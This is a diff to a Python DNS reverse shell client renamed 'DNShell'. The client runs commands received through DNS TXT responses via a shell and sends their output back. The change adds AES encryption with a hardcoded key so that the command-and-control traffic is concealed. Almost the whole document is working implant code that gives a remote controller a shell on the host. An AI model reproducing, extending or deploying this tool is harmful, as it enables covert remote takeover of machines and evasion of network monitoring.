@@ -1,8 +1,8 @@
 #!/usr/bin/env python
-#RevShell DNS Client v1
+# DNShell Client v1.3
 
-import os
-import subprocess
+from Crypto.Cipher import AES
+import subprocess, os
 import dns.resolver
 import textwrap, base64
  
@@ -12,6 +12,32 @@ TLD = 'com'
 NXT_CMD = 'nxt'
 ANSWER = ';ANSWER'
 TYPE = 'TXT'
+
+# REPLACE THIS WITH YOUR OWN KEY #
+secret = "TyKuwAt5vg1m48z2qYs6cUalHQrDpG0B"
+
+# the block size for the cipher object; must be 16, 24, or 32 for AES
+BLOCK_SIZE = 32
+
+# the character used for padding-
+PADDING = '{'
+# one-liner to sufficiently pad the text to be encrypted
+pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * PADDING
+# encrypt with AES, encode with base64
+EncodeAES = lambda c, s: base64.b64encode(c.encrypt(pad(s)))
+DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e)).rstrip(PADDING)
+
+# create a cipher object using the random secret
+cipher = AES.new(secret)
+
+def encrypt(string):
+  encoded = EncodeAES(cipher, string)
+  return encoded
+
+def decrypt(string):
+  decoded = DecodeAES(cipher, string)
+  return decoded
+
 # Default connection reset string, b64 encoded:
 nextCommand = base64.b64encode(NXT_CMD)
 
@@ -47,14 +73,20 @@ def encodeB64Equals(output):
 
 def runCmd(cmd):
   # Parse command from response
-  nxtCmd = base64.b64decode(cmd)
+  eNxtCmd = base64.b64decode(cmd)
+  # Decrypt response
+  nxtCmd = decrypt(eNxtCmd)
+ 
   # Check for server quit command
   if nxtCmd == "quit": exit(0)
   # Execute server command
   proc = subprocess.Popen(nxtCmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
   stdoutput = proc.stdout.read() + proc.stderr.read()
+ 
+  # Encrypt output
+  eStdoutput = encrypt(stdoutput)
   # Encode output data, ready for loop
-  output = base64.b64encode(stdoutput)
+  output = base64.b64encode(eStdoutput)
   output = encodeB64Equals(output)
 
   return output
